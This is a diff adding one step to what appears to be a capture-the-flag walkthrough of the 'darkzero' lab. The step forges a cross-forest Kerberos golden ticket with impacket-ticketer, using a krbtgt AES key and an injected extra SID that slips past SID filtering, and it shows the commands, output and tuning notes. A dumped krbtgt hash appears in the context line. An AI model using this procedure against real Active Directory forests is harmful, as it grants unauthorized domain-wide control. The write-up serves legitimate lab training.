@@ -3975,6 +3975,79 @@ krbtgt:0x17:8beaf5f950fefe79f608390a806d29a7
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+#### 4.12 — Forge a cross-forest golden ticket with an injected SID
+
+**Why this step:** The krbtgt key for `darkzero.ext` is held, and `InfrastructureAdministrators` (RID 1603) in `darkzero.htb` is a member of Backup Operators. Forge a TGT asserting that group membership as an extra SID, exploiting SID filtering's RID ≥ 1000 exemption.
+
+**Command:**
+
+bash
+
+```bash
+impacket-ticketer -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
+  -domain darkzero.ext \
+  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
+  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
+  administrator
+
+export KRB5CCNAME=$(pwd)/administrator.ccache
+klist
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`impacket-ticketer`|Forge a Kerberos TGT offline|Build a ticket without asking the KDC|
+|`-aesKey <krbtgt AES256>`|Sign with the krbtgt AES key|**Required** — `-nthash` produces RC4, which the DC rejects|
+|`-domain darkzero.ext`|Realm the ticket claims to come from|The compromised forest|
+|`-domain-sid`|Source domain SID|Identifies the issuing domain|
+|`-extra-sid <target SID>-1603`|Inject `InfrastructureAdministrators` into the PAC|Claim membership in the _other_ forest's group|
+|`administrator`|Principal name asserted|Need not exist — we hold the signing key|
+
+**Result:**
+
+```
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for darkzero.ext/administrator
+[*]     PAC_LOGON_INFO
+[*] Signing/Encrypting final ticket
+[*] Saving ticket in administrator.ccache
+```
+
+```
+Default principal: administrator@DARKZERO.EXT
+Valid starting       Expires              Service principal
+07/29/2026 11:16:11  07/26/2036 11:16:11  krbtgt/DARKZERO.EXT@DARKZERO.EXT
+```
+
+**Key findings:**
+
+- Golden ticket forged for `administrator@DARKZERO.EXT` carrying the target forest's `InfrastructureAdministrators` SID in its PAC.
+- **The AES256 key is mandatory.** An initial attempt using `-nthash` produced an RC4-encrypted ticket and DC01 rejected it with `KDC_ERR_ETYPE_NOSUPP` — modern Windows disables RC4 for cross-realm referrals. Dumping AES keys alongside NT hashes during DCSync is therefore not optional.
+- The ten-year validity is impacket's default and is a reliable forensic indicator of a forged rather than KDC-issued ticket.
+- RID 1603 exceeds the 1000 threshold, so SID filtering under "Treat as External" permits it across the trust boundary. Injecting Backup Operators (RID 551) directly would have been stripped.
+
+**Next:** Prepare Kerberos client configuration on the attacking host and authenticate to DC01
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
